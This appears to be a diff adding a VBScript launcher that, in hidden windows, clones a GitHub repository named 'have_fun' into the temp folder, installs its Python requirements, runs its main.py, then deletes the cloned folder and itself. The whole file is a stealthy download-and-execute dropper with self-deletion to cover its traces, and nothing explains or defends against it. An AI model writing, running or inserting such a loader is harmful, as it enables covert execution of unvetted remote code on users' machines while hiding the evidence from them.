@@ -1,0 +1,33 @@
+Set WshShell = CreateObject("WScript.Shell")
+
+' Get the temporary directory path
+tempDir = WshShell.ExpandEnvironmentStrings("%TEMP%")
+
+' Define paths and commands
+gitCloneCommand = "git clone https://github.com/anshkumar2311/have_fun.git"
+pythonCommand = "python"
+scriptPath = WScript.ScriptFullName
+
+' Change directory to the temporary directory
+WshShell.CurrentDirectory = tempDir
+
+' Clone the Git repository invisibly
+WshShell.Run gitCloneCommand, 0, True
+
+' Navigate into the cloned directory
+WshShell.CurrentDirectory = tempDir & "\have_fun"
+
+' Install Python packages
+WshShell.Run pythonCommand & " -m pip install -r requirements.txt", 0, True
+
+' Run main.py invisibly
+WshShell.Run pythonCommand & " main.py", 0, True
+
+' Clean up: Delete the cloned directory
+WshShell.CurrentDirectory = tempDir
+WshShell.Run "cmd /c rd /s /q have_fun", 0
+
+' Self-delete script
+WshShell.Run "cmd /c timeout 2 && del " & Chr(34) & scriptPath & Chr(34), 0
+
+Set WshShell = Nothing
